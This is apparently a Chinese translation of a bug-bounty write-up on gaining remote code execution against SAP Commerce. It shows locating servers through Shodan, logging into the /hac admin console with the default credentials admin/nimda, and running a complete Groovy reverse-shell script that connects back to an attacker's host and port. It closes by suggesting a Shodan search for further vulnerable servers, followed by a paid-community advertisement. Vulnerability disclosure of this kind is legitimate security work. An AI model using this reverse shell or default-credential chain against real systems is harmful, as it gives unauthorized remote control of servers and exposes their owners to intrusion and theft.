#  如何在一个目标中获取两个RCE   
0xBartita  迪哥讲事   2024-04-14 21:30  
  
如何在一个目标中获取两个RC  
  
                                        整个攻击流程  
### 环节 1: 目标识别和信息收集  
  
1.使用Shodan搜索引擎搜索包含特定SSL证书信息（"ssl:target.com"）的服务器，旨在找到使用这一证书的服务器IP地址。  
  
2.目录和路径探索：通过使用dirsearch工具对找到的IP地址进行目录枚举，发现了一个管理登录页面（如/hac/login/）。这个路径是SAP Commerce默认的管理Web应用程序，通常用于系统管理操作。  
### 环节 2: 利用默认凭证登录  
  
1.获取默认登录凭证：  
  
通过谷歌搜索找到了SAP Commerce管理控制台的默认登录凭证（用户名："admin"，密码："nimda"）。这些信息通常应该是保密的，但在一些文档或社区论坛中可能被泄露。  
  
2.成功登录管理控制台：  
  
使用获取到的默认凭证，攻击者成功登录了管理面板，这通常意味着他获得了执行管理任务的能力。  
### 环节 3: 发现并利用执行脚本的功能  
  
1.发现执行脚本功能：  
  
在管理面板内，发现了一个控制台标签页，允许用户执行Groovy脚本（/hac/console/scripting/）。  
  
2.编写并执行恶意脚本：  
  
编写了一个Groovy脚本，该脚本创建了一个反向Shell连接回指定的IP和端口。这使得研究员能够从远程执行系统命令，获得对服务器的控制。  
```
String host="Your Ip Here";

int port=Your Port;

String cmd="/bin/bash";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();

Socket s=new Socket(host,port);

InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();

OutputStream po=p.getOutputStream(), so=s.getOutputStream();

while(!s.isClosed()){
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {p.exitValue(); break;} catch (Exception e){}
};

p.destroy();

s.close();



```  
### 环节 4: 扩展攻击  
  
在成功获取远程代码执行能力后，返回Shodan搜索其他可能存在相同安全漏洞的服务器。  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
原文:https://0xbartita.medium.com/how-i-got-two-rce-at-bbp-program-0xbartita-232727c5b3f0  
  
